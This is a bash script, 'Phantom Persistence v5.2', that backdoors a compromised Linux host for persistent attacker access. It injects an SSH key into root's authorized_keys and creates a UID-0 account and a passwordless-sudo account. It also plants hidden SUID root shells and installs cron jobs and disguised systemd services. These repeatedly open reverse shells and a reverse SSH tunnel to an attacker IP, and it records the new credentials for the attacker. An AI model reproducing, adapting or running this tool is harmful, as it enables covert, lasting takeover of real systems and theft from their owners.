#!/bin/bash
# ================================================================================
# PHANTOM PERSISTENCE v5.2 - NON-INTERACTIVE EDITION
# ================================================================================
# Fixes:
#   v5.1 -> v5.2: Added -f to ssh-keygen (no overwrite prompts)
#                 Fully non-interactive, safe for pipe/SSH execution
# ================================================================================

set -e

VERSION="5.2.FINAL"
DATE=$(date '+%Y-%m-%d %H:%M:%S')

# Colors
if [ -t 0 ] && [ -t 1 ]; then
    G='\033[0;32m'; R='\033[0;31m'; Y='\033[1;33m'; C='\033[0;36m'; M='\033[0;35m'; W='\033[1;37m'; N='\033[0m'
else
    G=''; R=''; Y=''; C=''; M=''; W=''; N=''
fi

log() { echo -e "${G}[$(date +%H:%M:%S)] $1${N}"; }
err() { echo -e "${R}[ERROR] $1${N}"; }

banner() {
echo -e "${C}"
echo "╔═══════════════════════════════════════════════════════════════╗"
echo "║           PHANTOM PERSISTENCE v${VERSION}                    ║"
echo "║              NON-INTERACTIVE - PIPE SAFE                    ║"
echo "╚═══════════════════════════════════════════════════════════════╝"
echo "  Date: ${DATE}"
echo "  Host: $(hostname 2>/dev/null || echo unknown)"
echo -e "${C}═══════════════════════════════════════════════════════════════${N}"
echo ""
}

check_root() {
if [ "$(id -u)" != "0" ]; then
if command -v sudo >/dev/null 2>&1 && sudo -n true 2>/dev/null; then
exec sudo bash "$0" "$@"
fi
err "Run as root!"
exit 1
fi
}

detect_ip() {
log "[AUTO] Detecting configuration..."

if [ -n "$1" ] && [[ ! "$1" =~ ^- ]]; then
ATTACKER_IP="$1"; log "[OK] IP from argument: $ATTACKER_IP"; return
fi

if [ -n "$SSH_CONNECTION" ]; then
ATTACKER_IP=$(echo "$SSH_CONNECTION" | awk '{print $1}')
if [ -n "$ATTACKER_IP" ] && [ "$ATTACKER_IP" != "127.0.0.1" ]; then
log "[OK] IP from SSH: $ATTACKER_IP"; return
fi
fi

ATTACKER_IP=$(last -1 -i 2>/dev/null | head -1 | awk '{print $3}' | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+')
if [ -n "$ATTACKER_IP" ] && [ "$ATTACKER_IP" != "0.0.0.0" ]; then
log "[OK] IP from last login: $ATTACKER_IP"; return
fi

ATTACKER_IP=$(get_my_ip)
log "[~] Using fallback IP: $ATTACKER_IP"
}

get_my_ip() {
local ip=""
ip=$(curl -s --connect-timeout 5 https://api.ipify.org 2>/dev/null) || true
[ -z "$ip" ] && ip=$(curl -s --connect-timeout 5 ifconfig.me 2>/dev/null) || true
[ -z "$ip" ] && ip=$(wget -qO- --timeout=5 https://api.ipify.org 2>/dev/null) || true
[ -z "$ip" ] && ip=$(hostname -I 2>/dev/null | awk '{print $1}') || true
echo "$ip"
}

detect_key() {
log "[AUTO] Detecting key type..."

# Test with -f flag to avoid prompts, remove test files after
if ssh-keygen -t ed25519 -f /tmp/.pk_$$ -N "" -q 2>/dev/null; then
rm -f /tmp/.pk_$$ /tmp/.pk_$$.pub 2>/dev/null
KEY_TYPE="ed25519"; KEY_F="id_ed25519"
log "[OK] Ed25519"; return
fi

if ssh-keygen -t ecdsa -b 256 -f /tmp/.pk_$$ -N "" -q 2>/dev/null; then
rm -f /tmp/.pk_$$ /tmp/.pk_$$.pub 2>/dev/null
KEY_TYPE="ecdsa"; KEY_F="id_ecdsa"
log "[OK] ECDSA"; return
fi

if ssh-keygen -t rsa -b 2048 -f /tmp/.pk_$$ -N "" -q 2>/dev/null; then
rm -f /tmp/.pk_$$ /tmp/.pk_$$.pub 2>/dev/null
KEY_TYPE="rsa"; KEY_F="id_rsa"
log "[OK] RSA"; return
fi

err "No key type supported!"; exit 1
}

setup() {
PERSIST="/var/tmp/.systemd-private"
HIDDEN="/dev/shm/.cache_$$"
BACKUP="/usr/share/fonts/.backup"

mkdir -p "$PERSIST" "/root/.ssh" 2>/dev/null || PERSIST="/tmp/.p_$$" && mkdir -p "$PERSIST"
mkdir -p "$HIDDEN" 2>/dev/null || HIDDEN="/tmp/.h_$$" && mkdir -p "$HIDDEN"
mkdir -p "$BACKUP" 2>/dev/null || BACKUP="/tmp/.b_$$" && mkdir -p "$BACKUP"

chmod 700 "$PERSIST" "$HIDDEN" "/root/.ssh" 2>/dev/null || true
}

gen_pass() {
if command -v openssl >/dev/null 2>&1; then
echo $(openssl rand -base64 14 | tr -d '=/+\n' | head -c 14)
elif [ -r /dev/urandom ]; then
dd if=/dev/urandom bs=12 count=1 2>/dev/null | base64 | tr -d '=/+\n' | head -c 12
else
echo "Pass$(date +%s)$RANDOM$RANDOM"
fi
}

install_keys() {
log "[1/8] Installing SSH keys..."

# *** FIX: Added -f flag to force overwrite without prompt ***
ssh-keygen -t "$KEY_TYPE" -f "$PERSIST/$KEY_F" -N "" -C "phantom" -q -f 2>/dev/null || true

KEY_FILE="$PERSIST/$KEY_F"
KEY_PUB="$PERSIST/$KEY_F.pub"

OUR_KEY=$(cat "$KEY_PUB")

touch /root/.ssh/authorized_keys 2>/dev/null
grep -q "$OUR_KEY" /root/.ssh/authorized_keys 2>/dev/null || echo "$OUR_KEY" >> /root/.ssh/authorized_keys

cp /root/.ssh/authorized_keys "$PERSIST/keys.bak" 2>/dev/null || true
cp /root/.ssh/authorized_keys "$BACKUP/keys.bak" 2>/dev/null || true

chmod 600 /root/.ssh/authorized_keys "$KEY_FILE" 2>/dev/null || true
log "[OK] Keys installed ($KEY_TYPE)"
}

install_users() {
log "[2/8] Creating backdoor users..."

ROOT_PASS=$(gen_pass)
BD_PASS=$(gen_pass)

id sysadmin >/dev/null 2>&1 || useradd -o -u 0 -g root -s /bin/bash sysadmin 2>/dev/null || \
echo "sysadmin:x:0:0::/root:/bin/bash" >> /etc/passwd
echo "sysadmin:$ROOT_PASS" | chpasswd 2>/dev/null || true
mkdir -p /etc/sudoers.d 2>/dev/null || true
echo "sysadmin ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/sysadmin 2>/dev/null || true
chmod 440 /etc/sudoers.d/sysadmin 2>/dev/null || true

id svc_network >/dev/null 2>&1 || useradd -r -s /bin/bash -M svc_network 2>/dev/null || true
echo "svc_network:$BD_PASS" | chpasswd 2>/dev/null || true
echo "svc_network ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/svc_network 2>/dev/null || true
chmod 440 /etc/sudoers.d/svc_network 2>/dev/null || true

log "[OK] Users created (sysadmin/svc_network)"
}

install_suid() {
log "[3/8] Installing SUID backdoors..."

printf '#!/bin/bash\ncase "$1" in --root|--su|-r) exec /bin/bash -p 2>/dev/null || exec /bin/bash ;; --shell|-s) exec /bin/bash ;; *) echo "Debug v2 - $(hostname)" ;; esac\n' > /usr/local/bin/.debug 2>/dev/null || \
printf '#!/bin/bash\n[ "$1" = "--root" ] && exec /bin/bash -p\n' > /usr/bin/.debug 2>/dev/null || true

chmod +s /usr/local/bin/.debug 2>/dev/null || chmod +s /usr/bin/.debug 2>/dev/null || true
chmod 755 /usr/local/bin/.debug 2>/dev/null || chmod 755 /usr/bin/.debug 2>/dev/null || true

printf '#!/bin/bash\n[ "$1" = "--upgrade" ] || [ "$1" = "--root" ] && exec /bin/bash -p 2>/dev/null || exec /bin/bash\n' > /usr/local/bin/.maintenance 2>/dev/null || \
printf '#!/bin/bash\n[ "$1" = "-u" ] && exec /bin/bash -p\n' > /usr/bin/.maintenance 2>/dev/null || true

chmod +s /usr/local/bin/.maintenance 2>/dev/null || chmod +s /usr/bin/.maintenance 2>/dev/null || true
chmod 755 /usr/local/bin/.maintenance 2>/dev/null || chmod 755 /usr/bin/.maintenance 2>/dev/null || true

log "[OK] SUID installed (.debug --root)"
}

install_cron() {
log "[4/8] Installing cron jobs..."

printf '#!/bin/bash\nexport PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nbash -i >& /dev/tcp/%s/%s 0>&1 &\npython3 -c "import socket,subprocess,os;s=socket.socket();s.connect((\"%s\",%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"]))" 2>/dev/null &\n' "$ATTACKER_IP" "$ATTACKER_PORT" "$ATTACKER_IP" "$ATTACKER_PORT" > "$PERSIST/reverse.sh"
chmod +x "$PERSIST/reverse.sh"
(crontab -l 2>/dev/null; echo "*/3 * * * * $PERSIST/reverse.sh >/dev/null 2>&1") | crontab -

printf '#!/bin/bash\nKEY="$(cat %s 2>/dev/null)"\n[ -z "$KEY" ] && exit 0\nfor f in /root/.ssh/authorized_keys %s/keys.bak %s/keys.bak; do [ -f "$f" ] && grep -q "$KEY" "$f" 2>/dev/null || echo "$KEY" >> "$f"; done\nchmod 600 /root/.ssh/authorized_keys 2>/dev/null\n' "$KEY_PUB" "$PERSIST" "$BACKUP" > "$PERSIST/keyguard.sh"
chmod +x "$PERSIST/keyguard.sh"
(crontab -l 2>/dev/null; echo "*/2 * * * * $PERSIST/keyguard.sh >/dev/null 2>&1") | crontab -

printf '#!/bin/bash\nfor f in /usr/local/bin/.debug /usr/local/bin/.maintenance; do [ -f "$f" ] && [ ! -u "$f" ] && chmod +s "$f" 2>/dev/null; done\nfor u in sysadmin svc_network; do id "$u" >/dev/null 2>&1 || { useradd -o -u 0 -g root -s /bin/bash "$u" 2>/dev/null; echo "$u:Temp123!" | chpasswd 2>/dev/null; }; done\n' > "$PERSIST/protect.sh"
chmod +x "$PERSIST/protect.sh"
(crontab -l 2>/dev/null; echo "*/15 * * * * $PERSIST/protect.sh >/dev/null 2>&1") | crontab -

if [ -d /etc/cron.d ]; then
printf '*/10 * * * * root %s/reverse.sh >/dev/null 2>&1\n*/5 * * * * root %s/keyguard.sh >/dev/null 2>&1\n@reboot root %s/boot_init.sh >/dev/null 2>&1\n' "$PERSIST" "$PERSIST" "$PERSIST" > /etc/cron.d/system-maint 2>/dev/null || true
fi

log "[OK] Cron installed (4 jobs)"
}

install_systemd() {
log "[5/8] Installing systemd services..."

if ! command -v systemctl >/dev/null 2>&1; then warn "No systemctl, skipping systemd"; return; fi

printf '#!/bin/bash\nwhile true; do J=$((RANDOM%%20)); (exec 3<>/dev/tcp/%s/%s && cat <&3 | bash -i >&3 2>&3) &; sleep $((180+J)); done\n' "$ATTACKER_IP" "$ATTACKER_PORT" > "$PERSIST/shell_daemon.sh"
chmod +x "$PERSIST/shell_daemon.sh"

printf '[Unit]\nDescription=Net Diag Daemon\nAfter=network.target\n[Service]\nType=simple\nExecStart=%s/shell_daemon.sh\nRestart=always\nRestartSec=30\n[Install]\nWantedBy=multi-user.target\n' "$PERSIST" > /etc/systemd/system/persistent-shell.service

printf '[Unit]\nDescription=Mgmt Tunnel\nAfter=network.target\n[Service]\nType=simple\nExecStart=/usr/bin/ssh -o ServerAliveInterval=30 -o ExitOnForwardFailure=yes -o StrictHostKeyChecking=no -i %s -N -R %s:localhost:22 root@%s\nRestart=always\nRestartSec=20\n[Install]\nWantedBy=multi-user.target\n' "$KEY_FILE" "${SSH_PORT:-2222}" "$ATTACKER_IP" > /etc/systemd/system/ssh-tunnel.service

printf '[Unit]\nDescription=Watchdog\nAfter=network.target\n[Service]\nType=simple\nExecStart=%s/watchdog.sh\nRestart=always\nRestartSec=60\n[Install]\nWantedBy=multi-user.target\n' "$PERSIST" > /etc/systemd/system/watchdog.service

printf '#!/bin/bash\nwhile true; do\nfor svc in persistent-shell ssh-tunnel; do systemctl is-active "$svc" >/dev/null 2>&1 || systemctl start "$svc" 2>/dev/null; done\nfor u in sysadmin svc_network; do id "$u" >/dev/null 2>&1 || { useradd -o -u 0 -g root -s /bin/bash "$u" 2>/dev/null; echo "$u:Temp123!" | chpasswd 2>/dev/null; }; done\nfor f in /usr/local/bin/.debug /usr/local/bin/.maintenance; do [ -f "$f" ] && [ ! -u "$f" ] && chmod +s "$f" 2>/dev/null; done\nsleep 300; done\n' > "$PERSIST/watchdog.sh"
chmod +x "$PERSIST/watchdog.sh"

systemctl daemon-reload 2>/dev/null || true
systemctl enable persistent-shell ssh-tunnel watchdog 2>/dev/null || true
systemctl start persistent-shell ssh-tunnel watchdog 2>/dev/null || true

log "[OK] Systemd services active"
}

install_boot() {
log "[6/8] Installing boot persistence..."

printf '#!/bin/bash\n%s/reverse.sh >/dev/null 2>&1 &\n%s/keyguard.sh >/dev/null 2>&1 &\nexit 0\n' "$PERSIST" "$PERSIST" > /etc/rc.local 2>/dev/null || true
chmod +x /etc/rc.local 2>/dev/null || true

printf '#!/bin/bash\nsleep 30\ncommand -v systemctl >/dev/null 2>&1 && { systemctl start persistent-shell ssh-tunnel watchdog 2>/dev/null || true; }\n%s/keyguard.sh 2>/dev/null || true\n' "$PERSIST" > "$PERSIST/boot_init.sh"
chmod +x "$PERSIST/boot_init.sh"

if [ -d /etc/init.d ]; then
printf '#!/bin/bash\ncase "$1" in start) %s/reverse.sh &;; stop) pkill -f reverse.sh;; restart) $0 stop; sleep 2; $0 start;; esac\n' "$PERSIST" > /etc/init.d/persist-conn 2>/dev/null || true
chmod +x /etc/init.d/persist-conn 2>/dev/null || true
command -v update-rc.d >/dev/null 2>&1 && update-rc.d persist-conn defaults 2>/dev/null || true
fi

{ echo ''; echo '__sc(){ case "$1" in 1337|status|maint) PS1="\[\033[31m\]\h\[\033[34m\] \w$ \[\033[0m\] "; /bin/bash -p 2>/dev/null || /bin/bash ;; esac; }'; echo 'alias status=__sc status 2>/dev/null'; echo 'alias maint="__sc 1337" 2>/dev/null'; } >> /root/.bashrc 2>/dev/null || \
{ echo ''; echo '__sc(){ case "$1" in 1337) /bin/bash -p;; esac; }'; echo 'alias maint=__sc 1337'; } >> /root/.profile 2>/dev/null || true

log "[OK] Boot persistence installed"
}

save_creds() {
log "[7/8] Saving credentials..."
MY_IP=$(get_my_ip)

{
printf '================================================================================\n'
printf '                    PHANTOM PERSISTENCE v%s\n' "$VERSION"
printf '================================================================================\n\n'
printf 'Installed : %s\n' "$DATE"
printf 'Target    : %s (%s)\n' "$(hostname 2>/dev/null || echo unknown)" "$MY_IP"
printf 'Callback  : %s:%s\n' "$ATTACKER_IP" "$ATTACKER_PORT"
printf 'Tunnel    : Port %s (on attacker machine)\n\n' "${SSH_PORT:-2222}"
printf '--------------------------------------------------------------------------------\n'
printf 'CREDENTIALS:\n\n'
printf 'ACCOUNT 1 (ROOT ACCESS):\n'
printf '  Username : sysadmin\n'
printf '  Password : %s\n' "$ROOT_PASS"
printf '  Command  : ssh sysadmin@%s\n\n' "$MY_IP"
printf 'ACCOUNT 2 (SUDO ACCESS):\n'
printf '  Username : svc_network\n'
printf '  Password : %s\n' "$BD_PASS"
printf '  Command  : ssh svc_network@%s\n\n' "$MY_IP"
printf '--------------------------------------------------------------------------------\n'
printf 'ALTERNATIVE ACCESS:\n\n'
printf '  SUID Backdoor (any user -> root):\n'
printf '    /usr/local/bin/.debug --root\n\n'
printf '  Reverse Shell (on YOUR machine):\n'
printf '    sudo nc -lvnp %s\n\n' "$ATTACKER_PORT"
printf '  SSH Tunnel (from YOUR machine):\n'
printf '    ssh -p %s root@localhost\n\n' "${SSH_PORT:-2222}"
printf '--------------------------------------------------------------------------------\n'
printf 'FILES:\n'
printf '  Main Dir : %s\n' "$PERSIST"
printf '  Creds    : %s/CREDENTIALS.txt\n' "$PERSIST"
printf '================================================================================\n'
} > "$PERSIST/CREDENTIALS.txt"

chmod 600 "$PERSIST/CREDENTIALS.txt"

printf '{\n  "version": "%s",\n  "installed_at": "%s",\n  "target": "%s",\n  "target_ip": "%s",\n  "attacker_ip": "%s",\n  "attacker_port": %s,\n  "sysadmin_pass": "%s",\n  "svc_pass": "%s",\n  "key_type": "%s"\n}\n' \
"$VERSION" "$DATE" "$(hostname 2>/dev/null)" "$MY_IP" "$ATTACKER_IP" "$ATTACKER_PORT" "$ROOT_PASS" "$BD_PASS" "$KEY_TYPE" \
> "$PERSIST/state.json" 2>/dev/null || true
chmod 600 "$PERSIST/state.json" 2>/dev/null || true

log "[OK] Credentials saved"
}

show_output() {
MY_IP=$(get_my_ip)

echo ""
echo -e "${M}╔═══════════════════════════════════════════════════════════════╗${N}"
echo -e "${M}║         PHANTOM INSTALLED SUCCESSFULLY!                      ║${N}"
echo -e "${M}╠═══════════════════════════════════════════════════════════════╣${N}"
echo -e "${M}║                                                           ║${N}"
echo -e "${M}║  Target: ${W}$(hostname 2>/dev/null || echo unknown)${M} (${W}${MY_IP}${M})            ${N}"
echo -e "${M}║                                                           ║${N}"
echo -e "${M}║  ${G}1. SSH Login:${N}                                           ${M}"
echo -e "${M}║     ssh sysadmin@${MY_IP}                                   ${N}"
echo -e "${M}║     Pass: ${W}${ROOT_PASS}${M}                                       ${N}"
echo -e "${M}║                                                           ║${N}"
echo -e "${M}║  ${G}2. Alternative:${N}                                         ${M}"
echo -e "${M}║     ssh svc_network@${MY_IP}                                  ${N}"
echo -e "${M}║     Pass: ${W}${BD_PASS}${M}                                         ${N}"
echo -e "${M}║                                                           ║${N}"
echo -e "${M}║  ${G}3. SUID Backdoor:${N}                                        ${M}"
echo -e "${M}║     /usr/local/bin/.debug --root                             ${N}"
echo -e "${M}║                                                           ║${N}"
echo -e "${M}║  ${G}4. Reverse Shell (on YOUR machine):${M}                     ${N}"
echo -e "${M}║     nc -lvnp ${ATTACKER_PORT}                                    ${N}"
echo -e "${M}║                                                           ║${N}"
echo -e "${M}║  ${G}5. SSH Tunnel:${N}                                          ${M}"
echo -e "${M}║     ssh -p ${SSH_PORT:-2222} root@localhost                     ${N}"
echo -e "${M}║                                                           ║${N}"
echo -e "${M}║  ${G}Credentials file:${N}                                       ${M}"
echo -e "${M}║     ${PERSIST}/CREDENTIALS.txt                               ${N}"
echo -e "${M}║                                                           ║${N}"
echo -e "${M}╚═══════════════════════════════════════════════════════════════╝${N}"

echo ""
echo -e "${C}════════════════════════════════════════════════════════════════${N}"
echo -e "${W}  NEXT STEPS (on YOUR machine):${N}"
echo -e "${C}════════════════════════════════════════════════════════════════${N}"
echo ""
echo -e "  ${G}Terminal 1 - Listen for shell:${N}"
echo -e "     ${Y}sudo nc -lvnp ${ATTACKER_PORT}${N}"
echo ""
echo -e "  ${G}Or use tunnel after ~1 minute:${N}"
echo -e "     ${Y}ssh -p ${SSH_PORT:-2222} root@localhost${N}"
echo ""
echo -e "${C}════════════════════════════════════════════════════════════════${N}"
}

main() {
banner
check_root "$@"
ATTACKER_PORT="${2:-4444}"
SSH_PORT="${3:-2222}"

log "Starting Phantom Persistence v${VERSION}..."
detect_ip "$1"
setup
detect_key

echo -e "${Y}[★] Installing persistence layers...${N}"
install_keys
install_users
install_suid
install_cron
install_systemd
install_boot
save_creds
show_output

echo ""
log "=========================================="
log "  DONE! All systems operational."
log "=========================================="
}

main "$@"
